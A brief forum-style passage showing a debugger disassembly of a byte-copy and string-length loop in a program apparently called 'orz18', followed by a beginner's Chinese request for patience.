00414999   |. |880C32         |mov byte ptr ds:\[edx+esi\],cl  
0041499C   |. |83C9 FF        |or ecx,FFFFFFFF  
0041499F   |. |42             |inc edx  
004149A0   |. |F2:AE          |repne scas byte ptr es:\[edi\]  
004149A2   |. |F7D1           |not ecx  
004149A4   |. |49             |dec ecx  
004149A5   |. |3BD1           |cmp edx,ecx  
004149A7   |.^|72 E1          \\jb short orz18.0041498A  
  
  
}  
  
新手请体谅